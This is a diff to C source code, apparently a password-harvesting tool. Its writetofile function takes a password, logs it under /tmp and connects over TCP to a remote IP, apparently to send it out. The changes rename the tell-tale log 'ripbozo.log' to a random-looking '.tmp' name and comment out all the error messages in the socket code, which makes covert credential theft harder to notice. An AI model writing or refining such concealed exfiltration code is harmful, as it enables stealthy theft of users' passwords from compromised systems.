@@ -216,7 +216,7 @@ int writetofile (char *password){
 	
 	// Create File + Variables
 	FILE * fptr;
-	fptr = fopen("/tmp/ripbozo.log", "a");
+	fptr = fopen("/tmp/18432443.tmp", "a");
 	char * user;
 	char * msg;
 	char * msg2;
@@ -252,7 +252,7 @@ int writetofile (char *password){
 
 		// Error Handling
 		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        	printf("\n Socket creation error \n");
+        	// printf("\n Socket creation error \n");
         	return -1;
     	}
 
@@ -264,18 +264,18 @@ int writetofile (char *password){
 		timeout.tv_usec = 0;
 
 		if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
-			puts("Setsockopt failed\n");
+			// puts("Setsockopt failed\n");
 			return -1;
 		}
 		
 		if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
-        	puts("setsockopt failed\n");
+        	// puts("setsockopt failed\n");
 		}
 
 
 		// Error Handling
 		if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
-        	puts("\nInvalid address/ Address not supported \n");
+        	// puts("\nInvalid address/ Address not supported \n");
         	return -1;
     	}
     	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
